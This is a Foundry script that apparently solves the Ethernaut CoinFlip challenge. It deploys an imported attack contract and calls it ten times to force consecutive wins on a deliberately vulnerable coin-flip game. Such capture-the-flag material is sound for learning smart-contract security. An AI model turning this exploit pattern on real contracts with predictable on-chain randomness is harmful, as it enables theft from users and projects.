// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../DeployedSolver.s.sol";
import "ethernaut/levels/CoinFlip.sol";
import "../../src/attacks/CoinFlipAttack.sol";

/**
 * @title CoinFlipSolver
 * @notice Script to solve the deployed CoinFlip challenge
 * @dev Run with `forge script script/solutions/CoinFlipSolver.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract CoinFlipSolver is DeployedSolverBase {
    CoinFlip public coinFlipContract;
    CoinFlipAttack public attackContract;
    
    function setUp() public override {
        super.setUp();
        
        // Get the deployed instance address
        address instanceAddress = vm.envAddress("COINFLIP_ADDRESS");
        coinFlipContract = CoinFlip(instanceAddress);
        
        console.log("CoinFlip contract address:", address(coinFlipContract));
        console.log("Current consecutive wins:", coinFlipContract.consecutiveWins());
    }
    
    function run() public {
        // Deploy the attack contract
        console.log("Deploying attack contract...");
        attackContract = new CoinFlipAttack(address(coinFlipContract));
        console.log("Attack contract deployed at:", address(attackContract));
        
        // Execute the attack 10 times (need to wait for a new block each time)
        console.log("Starting attacks...");
        
        uint256 initialWins = coinFlipContract.consecutiveWins();
        uint256 targetWins = 10;
        
        // In a real script, you'd need to wait for new blocks between calls
        // For demonstration purposes, we're using vm.roll to simulate new blocks
        for (uint256 i = 0; i < targetWins; i++) {
            // Simulate a new block
            vm.roll(block.number + 1);
            
            // Execute the attack
            console.log("Attack attempt", i + 1);
            attackContract.attack();
            
            // Check progress
            console.log("Consecutive wins:", coinFlipContract.consecutiveWins());
        }
        
        // Verify we've won enough times
        uint256 finalWins = coinFlipContract.consecutiveWins();
        require(finalWins >= targetWins, "Not enough consecutive wins");
        
        console.log("Initial wins:", initialWins);
        console.log("Final wins:", finalWins);
        logSuccess();
    }
} 